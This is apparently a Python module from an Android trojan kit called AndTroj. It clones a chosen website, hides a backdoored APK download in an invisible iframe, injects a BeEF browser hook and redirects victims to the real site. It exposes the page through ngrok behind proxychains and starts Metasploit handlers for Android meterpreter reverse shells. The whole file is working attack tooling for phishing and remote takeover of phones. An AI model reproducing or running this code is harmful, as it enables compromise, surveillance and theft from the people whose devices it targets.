#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
from core.menu import *


NGHOST = "127.0.0.1"
kutation = '"'
bslash1 = '\\'
bslash2 = '\\'
bslash = bslash1 + bslash2
slashkutat = bslash1 + kutation
dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
out8 = tmp + 'ngrok.txt'
out9 = tmp + 'ngrok_beef.txt'
protcl = tmp + 'protocol.txt'
ng_url = tmp + 'ngrok_url.txt'
NPAY_APK = tmp + 'nampay_apk.txt'
_apk_ = tmp + '_apk_.txt'


LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])


def _rename():
    global BKAPP, NPAY_APK, _apk_
    RN = BKAPP.replace(" ", "_")
    BKAPP_RN = (' ' in BKAPP) == True
    if BKAPP_RN == (True):
        shutil.copyfile(BKAPP, "{0}".format(RN))
        subprocess.call(
            'mv ' + RN + ' /var/www/html/',
            shell=True)
        subprocess.call(
            'echo ' + RN + ' >> ' + NPAY_APK,
            shell=True)
        subprocess.call(
            'YOY=$(sed -nE \'s/[^"]*\///p\' ' + NPAY_APK + ') && echo "$YOY" >> ' + _apk_,
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' ' + _apk_,
            shell=True)
    else:
        subprocess.call(
            'cp ' + BKAPP + ' /var/www/html/',
            shell=True)
        subprocess.call(
            'echo ' + BKAPP + ' >> ' + NPAY_APK,
            shell=True)
        subprocess.call(
            'YOY=$(sed -nE \'s/[^"]*\///p\' ' + NPAY_APK + ') && echo "$YOY" >> ' + _apk_,
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' ' + _apk_,
            shell=True)


def apk_atck():
    global LHOST, LPORT, BKAPP, fxs_
    subprocess.call(
        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
        shell=True)
    subprocess.call(
        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
        shell=True)

    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                          "\n\t[2] Ngrok CustomURL(Business)"
                          "\n\nroot@unk9vvn:~# ")
    URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
    BKAPP = raw_input("\t[?] BK-APK: ")
    _rename()
    f = open(_apk_)
    data = f.read()
    first_line = data.split('\n', 1)[0]

    if NGROK_SLT == "1":
        LHOST = raw_input("\n\t[?] LHOST: ")
        LPORT = raw_input("\t[?] LPORT: ")
        print "\n"
        subprocess.call(
            'proxychains ngrok update && noip2',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
            shell=True)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        subprocess.call(
            'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
            'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
            shell=True)
        chek_index = os.path.exists('/var/www/html/index.php')
        if chek_index == (True):
            subprocess.call(
                'rm /var/www/html/index.php',
                shell=True)
        else:
            pass
        subprocess.call(
            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
            shell=True)
        subprocess.call(
            'sed -i \'s#</body>#<iframe id="frame" src="' + first_line + '" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LHOST + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
            shell=True)
        checkauth = os.path.exists(protcl)
        if checkauth == (True):
            f = open(protcl, "r")
            cont = f.read()
            if cont == "reverse_tcp":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_http":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_https":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            else:
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
        else:
            pass
        print "\nI: Please 20 sec waiting...\n"
        time.sleep(7.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(10.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
        sys.exit()

    elif NGROK_SLT == "2":
        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                              "\n\t[?] CustomURL: ")
        NGHOST = "127.0.0.1"
        LGHOST = "0.tcp.ngrok.io"
        print "\n"
        subprocess.call(
            'proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
            shell=True)
        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
        if chek_nngk == (False):
            pass
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                shell=True)
        time.sleep(7.0)
        subprocess.call(
            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
            shell=True)
        fs = open(out9)
        length = 5
        LGPORT_BEEF = fs.read(length)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
        if chek_ngk == (True):
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        else:
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        chek_index = os.path.exists('/var/www/html/index.php')
        if chek_index == (True):
            subprocess.call(
                'rm /var/www/html/index.php',
                shell=True)
        else:
            pass
        subprocess.call(
            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
            shell=True)
        subprocess.call(
            'sed -i \'s#</body>#<iframe id="frame" src="' + first_line + '" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
            shell=True)
        checkauth = os.path.exists(protcl)
        if checkauth == (True):
            f = open(protcl, "r")
            cont = f.read()
            if cont == "reverse_tcp":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_http":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_https":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            else:
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
        else:
            pass
        print "\nI: Please 20 sec waiting...\n"
        time.sleep(7.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(10.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        print """
                     _   _             _       _____                      _      _       
                /\  | | | |           | |     / ____|                    | |    | |      
               /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___ 
              / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
             / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
            /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                                   | |                   
                                                                   |_|                   
"""
        sys.exit()
    else:
        sys.exit()
